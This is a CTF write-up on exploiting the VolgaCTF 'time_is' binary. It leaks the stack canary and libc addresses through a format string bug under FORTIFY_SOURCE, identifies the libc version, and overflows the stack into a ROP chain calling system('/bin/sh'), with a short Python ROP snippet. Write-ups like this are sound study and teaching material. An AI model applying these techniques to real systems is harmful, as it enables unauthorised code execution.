In this writeup I will share how I exploited my first ever pwn challenge on a CTF, which was a very small part of why we managed to qualify for the VolgaCTF finals in Samara, Russia! The exploit will use a format string vulnerability to leak the libc and the canary, and then we will use a stack buffer overflow to ROP and get code execution.

## Overview
```
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE
FORTIFY:  Enabled
```
The program is pretty simple. It does the following:
 1. Asks you `"Enter time zones separated by whitespace or q to quit"`.
 2. If you enter `"q"` it says `"See you!"` and quits.
 3. Whatever else you enter the program will echo what you entered appended with the time and loops back to 1.

Example: if you input `"asd"` it outputs `"asd: 21:30"`.

## Solution
### Finding the vulnerabilities
Firstly lets try to insert `%08x` as the input to see if the program is vulnerable to a **format string** vulnerability. It is!!

OK, so we can simply overwrite a GOT entry and redirect code execution. Right? Not so fast...
The binary is compiled with `FORTIFY SOURCE`. That means that we can't use `%n` to write and we can't use positional arguments `%<number>$x`. If we try, the program terminates and outputs `*** invalid %N$ use detected ***`.
In the past there have been bypasses to `FORTIFY SOURCE` as explain in this article <http://phrack.org/issues/67/9.html>, but it is hard if even possible! Lets look for a simpler solution and come back to this only if we don't find anything else.

The next logical thing to try is to input a very large amount of characters and see what happens. By running `python -c "print 'A'*2300 + '\nq\n'" | ./time_is` we get `*** stack smashing detected ***: ./time_is terminated`. We just found a **stack buffer overflow**! But.. the canary will detect us writing over the saved `rip` to redirect code execution. How can we avoid this?

### The plan:
1. Use the format string vulnerability to leak the canary
2. Use the format string vulnerability to leak several libc addresses
3. Use the leaked addresses to determine what is the libc version in use by the server, using a libc database (since the libc version is not given)
4. Use the overflow to control the saved `rip`, using the canary leak to prevent triggering detection
5. `ROP` it up, taking advantage of knowing where libc is loaded to call `system` and spawn a shell!


#### 1. Leaking the canary
To get the canary we simply leak the whole stack, extracting it from the offset `stack[267]` (determined by looking for it in gdb).

NOTE: We can't just do `%267$p` because of the `FORTIFY SOURCE`.

#### 2. Leaking libc addresses
To get the libc addresses we could just look for addresses in the stack belonging to libc and then calculate libc_base from that. However, since we don't know which libc version we are working with, lets leak addresses in the GOT so that, knowing ASLR works on page size (last 12 bits of the libc_base are always 0's (2^12=4Kb)), we can determine the libc version the server uses. The GOT addresses are static (program compiled without PIE) so we can just get them with `"objdump -TR time_is"`. Now we place the addresses in our input string and by trial and error we get the offsets right (testing with `%p` to prevent crashing) and leak them using `%s`.

#### 3. Determining the libc in use
To determine which libc the server was using I used this repository <https://github.com/niklasb/libc-database>. Running `./find setvbuf e70 free 940 gmtime d60` it finds _ubuntu-xenial-amd64-libc6_. We can then run `./dump libc6_2.23-0ubuntu7_amd64` to get offsets of interesting functions. Other offsets can be found in the symbols file.

#### 4. Controlling rip
Now we have everything we need!

We now send `padding+canary+extra-padding+ROP`. The canary to prevent detection, the extra padding because there are other saved registers before the saved `rip`. Just as proof of concept in the ROP I simply put the address of the main function, making it loop after a quit. It worked! Time to weaponize it!

#### 5. Weaponizing the ROP
Ok, now we just need to make it call `system("/bin/sh")`.

We know the address of `system` and the address of a `/bin/sh` string (both from libc). We need to put `/bin/sh` address in `rdi` and then call `system`. To accomplish this we can use `ROPGadget` to find a gadget such as `pop rdi; ret`.

Our simple ROP will look like this:
```python
ROP  = "".join([
    p64(pop_rdi_ret),    # pop rdi ; ret
    p64(bin_sh_str_adr), # "/bin/sh" in rdi
    p64(system_addr),    # ret to system
])
```

#### 6. Profit

## Exploit
NOTE: We have to pass an initial challenge in order to run the actual binary. This is just the way the organizers limited the amount of times you can run the program on the server. Because of this the exploit might take seconds to minutes to actually start running, since the challenge is often not solvable.
The challenge is not important for the exploit, but here it is: `Solve a puzzle: find an x such that 26 last bits of SHA1(x) are set, len(x)==29 and x[:24]=='<something>'`. Only needed remotely!
